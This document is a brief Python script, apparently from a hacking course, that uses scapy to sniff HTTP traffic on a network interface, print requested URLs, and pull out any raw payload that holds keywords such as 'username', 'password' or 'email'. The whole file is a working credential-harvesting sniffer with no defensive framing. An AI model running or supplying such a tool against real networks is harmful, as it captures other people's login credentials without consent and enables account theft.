#!/usr/bin/env python3
import re
import subprocess
import optparse
from termcolor import colored
import scapy.all as scapy
from scapy.layers import http



#TODO filter
# TODO add layer and field for packet
# TODO search for keyword
# TODO run with sudo
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("[+] HTTP Request "+url.decode())
        login_info=get_login_info(packet)
        if login_info:
            print(colored("\n\n[+] Usernames and passwords: ","blue")+login_info+"\n\n")

def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
    # if packet.haslayer(http.HTTPRequest):

    if packet.haslayer(scapy.Raw):

            # print(type(scapy.Raw))
        load = str(packet[scapy.Raw].load)
        # print("++++++++++++++++"+load)
        # if login page has different names for fields add them to keywords
        keywords = ["username", "user", "login", "password", "pass" ,"email"]
        for keyword in keywords:
            if keyword in load:
                return load

def main():

    sniff("eth0")

if __name__=="__main__":

    main()
